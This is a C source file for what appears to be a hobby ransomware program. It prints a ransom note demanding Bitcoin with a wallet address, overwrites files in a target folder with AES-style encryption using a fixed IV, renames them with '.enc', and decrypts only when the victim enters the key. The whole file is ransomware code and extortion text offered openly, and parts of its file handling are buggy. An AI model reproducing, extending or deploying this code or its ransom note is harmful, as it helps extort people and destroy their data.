/*
 *
 * Author: Merih Bora Po√ßan
 * Mail: mborapocan@gmail.com
 * Github: @borapocan <git@borapocan.com>
 * Creation Date: 17-04-2023
 * Last Modified: Sat Apr 22 12:36:27 2023
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include "ransomware.c"

int main(int argc, char **argv) {

	Ransomware *ransom = Ransomware__init();
	//Ransomware__name(ransom, get_name);
	//Ransomware__key(ransom, private_key);
	//Ransomware__key(private_key);
	puts("All your files has been encrypted. You can "
            "check it. The cost of\nencryption is $3000. You have to pay us"
	    "as BTC (Bitcoin). How to \nbuy BTC: Ask google or contact us, "
	    "we'll help you. Everything is\npossible to restore, but you "
	    "need to follow our instructions.\nOtherwise you can save your "
	    "data (NEVER). If you will not\ncooperate with our service - "
	    "for us, it doesn't matter. \nBut you will lose your time and data, \n"
	    "cause just we have the private key. In practise - time is\nmuch "
	    "more valuable than money.Any attempts to decrypt files will lead "
	    "to irreparable damage. \nGUARANTEES: We will surely restore your \n"
	    "files after receiving payment to our wallet.\n\nContacts: xxxxx@xxx"
            "\nSEND: 0.1 BTC to that wallet to decrypt:"
	    "3Dusdj8V6zFQQ6p4GyMbe1Eso5XTFoPmGu\n");

	ransom->set_key(ransom, argv[1]);
	printf("Key: %s\n", ransom->key);
	unsigned char *iv = (unsigned char *)"0123456789012345";
	printf("IV: %s\n", iv);

	char **files = Ransomware__get_files_in_folder("./files_to_decrypt");
	char **pfiles = files, **dfiles = files;
	//
	int check_encryption = 0;
	if(strlen(*files) > 4 && !strcmp(*files + strlen(*files) - 4, ".enc")) {
		check_encryption = 1;
		goto victim_input;
	}
	//while (*files) {
	//	puts(*files);
	//	files++;
	//}
	//int num;
	while (*files) {
		FILE *fptr;
		char str[128], *path = malloc(256);
		sprintf(path, "./files_to_decrypt/%s", *files);
		printf("\nPath: %s\n", path);
		// use appropriate location if you are using MacOS or Linux
		fptr = fopen(path, "r");
		if (fptr == NULL)
		{
			printf("Error!");
			exit(1);
		}
		printf("Content of %s are before encryption: \n", *files);
		while (fgets(str, 128, fptr) != NULL) {
			printf("%s", str);
		}
		fptr = fopen(path, "w");
		unsigned char *plaintext = (unsigned char*)str;
		unsigned char ciphertext[128];
		int ciphertext_len;
		ciphertext_len = encrypt(plaintext, strlen((char *)plaintext), ransom->key, iv, ciphertext);
		fprintf(fptr,"%s", ciphertext);
		fclose(fptr);
		files++;
	}
	while (*pfiles) {
		FILE *fptr;
		char str[128], *path = malloc(256), *enc_file = malloc(256);
		sprintf(path, "./files_to_decrypt/%s", *pfiles);
		//printf("\nPath: \n", path);
		// use appropriate location if you are using MacOS or Linux
		fptr = fopen(path, "r");
		if (fptr == NULL)
		{
			printf("Error!");
			exit(1);
		}
		printf("\nContent of %s are after encryption: \n", *pfiles);
		while (fgets(str, 128, fptr) != NULL) {
			printf("%s\n", str);
		}
		fclose(fptr);
		sprintf(enc_file, "%s.enc", path);
		rename(path, enc_file);
		pfiles++;
	}
victim_input:
	char *victim_key = malloc(strlen(ransom->key));
	printf("Please enter the key: ");
	scanf("%s", victim_key);
	//printf("Length: %s\n", strlen(victim_key));
	if (!compare_keys(ransom->key, victim_key)) {
		printf("Wrong!!!\n");
		exit(-1);
	} else {
		printf("Files will be decrypted.\n");
	}
	while (*dfiles) {
		FILE *fptr;
		char str[128], *path = malloc(256), *dec_file = malloc(256);
		if (check_encryption)
			sprintf(path, "./files_to_decrypt/%s", *dfiles);
		else
			sprintf(path, "./files_to_decrypt/%s.enc", *dfiles);
		strncpy(dec_file, path, strlen(path) - 4);
		printf("\nPath: %s\n", path);
		fptr = fopen(path, "r");
		if (fptr == NULL)
		{
			printf("Error!");
			exit(1);
		}
		printf("Content of %s are before decryption: \n", *dfiles);
		while (fgets(str, 128, fptr) != NULL) {
			printf("%s\n", str);
		}
		unsigned char *ciphertext = (unsigned char*)str;
		fptr = fopen(path, "w");
		unsigned char decryptedtext[128];
		int decryptedtext_len;
		decryptedtext_len = decrypt(ciphertext, strlen((char*)ciphertext), ransom->key, iv, decryptedtext);
		decryptedtext[decryptedtext_len] = '\0';
		fprintf(fptr,"%s", decryptedtext);
		fclose(fptr);
		//dec_file[strlen(dec_file)] = '\0';
		rename(path, dec_file);
		//puts(dec_file);
		dfiles++;
	}

	return 0;
}
